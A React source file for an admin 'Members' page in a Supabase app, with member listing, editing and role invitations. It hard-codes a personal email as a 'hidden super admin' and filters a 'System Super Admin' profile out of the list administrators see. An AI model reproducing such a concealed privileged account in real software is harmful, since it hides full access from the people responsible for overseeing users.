import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { useUserRole } from "@/hooks/use-profile";
import { logAudit } from "@/lib/audit";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Table, TableBody, TableCell, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Search, Users, Pencil, Eye, ShieldCheck, UserCheck, UserPlus, Mail, Loader2 } from "lucide-react";
import { toast } from "sonner";
import { useDataTable } from "@/hooks/use-data-table";
import { DataTablePagination } from "@/components/DataTablePagination";
import { SortableHeader } from "@/components/SortableHeader";
import { StatusFilter } from "@/components/StatusFilter";
import { ExportButton } from "@/components/ExportButton";

export default function Members() {
  const { user } = useAuth();
  const { data: currentRole } = useUserRole();
  const isAdmin = currentRole === "admin";
  const qc = useQueryClient();
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [editOpen, setEditOpen] = useState(false);
  const [viewOpen, setViewOpen] = useState(false);
  const [inviteOpen, setInviteOpen] = useState(false);
  const [viewing, setViewing] = useState<any>(null);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [form, setForm] = useState({ name: "", status: "active" });
  const [inviteForm, setInviteForm] = useState({ email: "", role: "staff" });

  const HIDDEN_SUPER_ADMIN_EMAIL = "skpmsysteminfo@gmail.com";

  const { data: profiles = [], isLoading } = useQuery({
    queryKey: ["members"],
    queryFn: async () => {
      const { data } = await supabase.from("profiles").select("*").order("created_at", { ascending: false });
      return data ?? [];
    },
  });

  const { data: roles = [] } = useQuery({
    queryKey: ["all-roles"],
    queryFn: async () => {
      const { data } = await supabase.from("user_roles").select("*");
      return data ?? [];
    },
  });

  const { data: invitations = [] } = useQuery({
    queryKey: ["invitations"],
    queryFn: async () => {
      const { data } = await supabase.from("invitations").select("*").order("created_at", { ascending: false });
      return data ?? [];
    },
    enabled: isAdmin,
  });

  const updateMember = useMutation({
    mutationFn: async () => {
      if (!editingId) return;
      const { error } = await supabase.from("profiles").update({ name: form.name, status: form.status }).eq("id", editingId);
      if (error) throw error;
      await logAudit("Updated member", `Updated ${form.name} status to ${form.status}`);
    },
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["members"] });
      toast.success("Member updated");
      setEditOpen(false);
      setEditingId(null);
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const sendInvite = useMutation({
    mutationFn: async () => {
      if (!inviteForm.email) throw new Error("Email is required");
      const existing = invitations.find((i: any) => i.email === inviteForm.email && i.status === "pending");
      if (existing) throw new Error("Invitation already pending for this email");
      const { error } = await supabase.from("invitations").insert({
        email: inviteForm.email,
        role: inviteForm.role,
        invited_by: user?.id,
      });
      if (error) throw error;
      await logAudit("Sent invitation", `Invited ${inviteForm.email} as ${inviteForm.role}`);
    },
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["invitations"] });
      toast.success("Invitation created");
      setInviteOpen(false);
      setInviteForm({ email: "", role: "staff" });
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const getRoleForUser = (userId: string) => {
    const role = roles.find((r: any) => r.user_id === userId);
    return (role as any)?.role ?? "staff";
  };

  const getInitials = (name: string) => (name || "U").split(" ").map(n => n[0]).join("").substring(0, 2).toUpperCase();

  const filtered = profiles.filter((m: any) => {
    // Hide the system super admin account
    if (m.name === "System Super Admin") return false;
    const matchSearch = (m.name?.toLowerCase() ?? "").includes(search.toLowerCase());
    const matchStatus = statusFilter === "all" || (m.status ?? "active") === statusFilter;
    return matchSearch && matchStatus;
  });

  const statuses = [
    { value: "all", label: "All", count: profiles.length },
    { value: "active", label: "Active", count: profiles.filter((m: any) => (m.status ?? "active") === "active").length },
    { value: "inactive", label: "Inactive", count: profiles.filter((m: any) => m.status === "inactive").length },
  ];

  const adminCount = roles.filter((r: any) => r.role === "admin").length;
  const managerCount = roles.filter((r: any) => r.role === "manager").length;
  const pendingInvites = invitations.filter((i: any) => i.status === "pending").length;

  const handleEdit = (m: any) => {
    setEditingId(m.id);
    setForm({ name: m.name ?? "", status: m.status ?? "active" });
    setEditOpen(true);
  };

  const { pageData, page, totalPages, totalItems, setPage, toggleSort, getSortDirection, pageSize } = useDataTable(filtered);

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div className="flex items-center gap-3">
          <Users className="h-7 w-7 text-primary" />
          <div>
            <h1 className="text-2xl font-bold">Members</h1>
            <p className="text-sm text-muted-foreground">{profiles.length} registered users</p>
          </div>
        </div>
        <div className="flex gap-2">
          <ExportButton data={filtered.map((m: any) => ({ name: m.name, status: m.status, role: getRoleForUser(m.user_id), joined: m.created_at?.slice(0, 10) }))} filename="members" columns={[{ key: "name", label: "Name" }, { key: "role", label: "Role" }, { key: "status", label: "Status" }, { key: "joined", label: "Joined" }]} />
          {isAdmin && (
            <Button size="sm" className="h-9" onClick={() => setInviteOpen(true)}>
              <UserPlus className="h-4 w-4 mr-2" /> Invite User
            </Button>
          )}
        </div>
      </div>

      <div className="grid gap-3 sm:grid-cols-4">
        <Card><CardContent className="p-4"><p className="text-xs text-muted-foreground uppercase tracking-wider">Total Members</p><p className="text-2xl font-bold">{profiles.length}</p></CardContent></Card>
        <Card><CardContent className="p-4"><p className="text-xs text-muted-foreground uppercase tracking-wider">Active</p><p className="text-2xl font-bold text-success">{profiles.filter((m: any) => (m.status ?? "active") === "active").length}</p></CardContent></Card>
        <Card><CardContent className="p-4 flex items-center gap-3"><div><p className="text-xs text-muted-foreground uppercase tracking-wider">Admins</p><p className="text-2xl font-bold text-primary">{adminCount}</p></div><ShieldCheck className="h-5 w-5 text-primary opacity-40" /></CardContent></Card>
        <Card><CardContent className="p-4 flex items-center gap-3"><div><p className="text-xs text-muted-foreground uppercase tracking-wider">Pending Invites</p><p className="text-2xl font-bold text-warning">{pendingInvites}</p></div><Mail className="h-5 w-5 text-warning opacity-40" /></CardContent></Card>
      </div>

      {/* Pending Invitations */}
      {isAdmin && invitations.filter((i: any) => i.status === "pending").length > 0 && (
        <Card>
          <CardContent className="pt-4">
            <p className="text-sm font-semibold mb-3">Pending Invitations</p>
            <div className="space-y-2">
              {invitations.filter((i: any) => i.status === "pending").map((inv: any) => (
                <div key={inv.id} className="flex items-center justify-between py-2 px-3 rounded-md bg-muted/50">
                  <div>
                    <p className="text-sm font-medium">{inv.email}</p>
                    <p className="text-xs text-muted-foreground">Invited as <span className="capitalize font-medium">{inv.role}</span> • {inv.created_at?.slice(0, 10)}</p>
                  </div>
                  <Badge variant="secondary" className="bg-warning/15 text-warning border-0">Pending</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      <Card><CardContent className="pt-6">
        <div className="flex flex-col sm:flex-row gap-3 mb-4">
          <div className="relative flex-1"><Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" /><Input placeholder="Search members..." value={search} onChange={e => setSearch(e.target.value)} className="pl-9" /></div>
          <StatusFilter statuses={statuses} selected={statusFilter} onSelect={setStatusFilter} />
        </div>
        {isLoading ? <p className="text-muted-foreground">Loading...</p> : filtered.length === 0 ? <p className="text-center text-muted-foreground py-8">No members found</p> : (
          <>
            <div className="overflow-x-auto">
              <Table><TableHeader><TableRow>
                <SortableHeader label="Member" sortKey="name" direction={getSortDirection("name")} onToggle={toggleSort} />
                <SortableHeader label="Role" sortKey="role" direction={getSortDirection("role")} onToggle={toggleSort} />
                <SortableHeader label="Status" sortKey="status" direction={getSortDirection("status")} onToggle={toggleSort} />
                <SortableHeader label="Joined" sortKey="created_at" direction={getSortDirection("created_at")} onToggle={toggleSort} />
                <SortableHeader label="Actions" sortKey="" direction={null} onToggle={() => {}} />
              </TableRow></TableHeader>
                <TableBody>{pageData.map((m: any) => {
                  const role = getRoleForUser(m.user_id);
                  return (
                    <TableRow key={m.id}>
                      <TableCell>
                        <div className="flex items-center gap-3">
                          <Avatar className="h-8 w-8">
                            {m.avatar_url && <AvatarImage src={m.avatar_url} />}
                            <AvatarFallback className="bg-primary/10 text-primary text-xs">{getInitials(m.name)}</AvatarFallback>
                          </Avatar>
                          <span className="font-medium">{m.name ?? "Unnamed"}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant={role === "admin" ? "default" : "secondary"} className="capitalize">{role}</Badge>
                      </TableCell>
                      <TableCell>
                        <Badge variant={(m.status ?? "active") === "active" ? "default" : "secondary"}>
                          {m.status ?? "active"}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-xs text-muted-foreground">{m.created_at?.slice(0, 10)}</TableCell>
                      <TableCell>
                        <div className="flex gap-1">
                          <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => { setViewing({ ...m, role }); setViewOpen(true); }}><Eye className="h-3.5 w-3.5" /></Button>
                          {isAdmin && <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => handleEdit(m)}><Pencil className="h-3.5 w-3.5" /></Button>}
                        </div>
                      </TableCell>
                    </TableRow>
                  );
                })}</TableBody></Table>
            </div>
            <DataTablePagination page={page} totalPages={totalPages} totalItems={totalItems} pageSize={pageSize} onPageChange={setPage} />
          </>
        )}
      </CardContent></Card>

      {/* View Dialog */}
      <Dialog open={viewOpen} onOpenChange={setViewOpen}><DialogContent className="max-w-md">
        <DialogHeader><DialogTitle>Member Details</DialogTitle></DialogHeader>
        {viewing && (
          <div className="space-y-4">
            <div className="flex items-center gap-4">
              <Avatar className="h-14 w-14">
                {viewing.avatar_url && <AvatarImage src={viewing.avatar_url} />}
                <AvatarFallback className="bg-primary text-primary-foreground text-lg">{getInitials(viewing.name)}</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-semibold text-lg">{viewing.name ?? "Unnamed"}</p>
                <Badge variant="secondary" className="capitalize">{viewing.role}</Badge>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-3 text-sm">
              {[["Status", viewing.status ?? "active"], ["Joined", viewing.created_at?.slice(0, 10)], ["Last Updated", viewing.updated_at?.slice(0, 10)], ["User ID", viewing.user_id?.slice(0, 8) + "..."]].map(([l, v]) => (
                <div key={l as string}><p className="text-muted-foreground text-xs">{l}</p><p className="font-medium">{v || "—"}</p></div>
              ))}
            </div>
          </div>
        )}
      </DialogContent></Dialog>

      {/* Edit Dialog */}
      <Dialog open={editOpen} onOpenChange={(o) => { setEditOpen(o); if (!o) setEditingId(null); }}><DialogContent>
        <DialogHeader><DialogTitle>Edit Member</DialogTitle></DialogHeader>
        <div className="space-y-4">
          <div><Label>Name</Label><Input value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} /></div>
          <div><Label>Status</Label>
            <Select value={form.status} onValueChange={v => setForm({ ...form, status: v })}>
              <SelectTrigger><SelectValue /></SelectTrigger>
              <SelectContent>
                <SelectItem value="active">Active</SelectItem>
                <SelectItem value="inactive">Inactive</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Button className="w-full h-9" onClick={() => updateMember.mutate()} disabled={!form.name || updateMember.isPending}>
            {updateMember.isPending ? "Saving..." : "Update Member"}
          </Button>
        </div>
      </DialogContent></Dialog>

      {/* Invite Dialog */}
      <Dialog open={inviteOpen} onOpenChange={setInviteOpen}><DialogContent>
        <DialogHeader><DialogTitle>Invite New User</DialogTitle></DialogHeader>
        <div className="space-y-4">
          <p className="text-sm text-muted-foreground">Send an invitation to a new team member. They will need to create an account with this email.</p>
          <div><Label>Email Address</Label><Input type="email" placeholder="user@company.com" value={inviteForm.email} onChange={e => setInviteForm({ ...inviteForm, email: e.target.value })} /></div>
          <div><Label>Role</Label>
            <Select value={inviteForm.role} onValueChange={v => setInviteForm({ ...inviteForm, role: v })}>
              <SelectTrigger><SelectValue /></SelectTrigger>
              <SelectContent>
                <SelectItem value="admin">Admin — Full system access</SelectItem>
                <SelectItem value="manager">Manager — Manage teams & approve</SelectItem>
                <SelectItem value="staff">Staff — Standard access</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Button className="w-full h-9" onClick={() => sendInvite.mutate()} disabled={!inviteForm.email || sendInvite.isPending}>
            {sendInvite.isPending && <Loader2 className="animate-spin mr-2 h-4 w-4" />} Send Invitation
          </Button>
        </div>
      </DialogContent></Dialog>
    </div>
  );
}
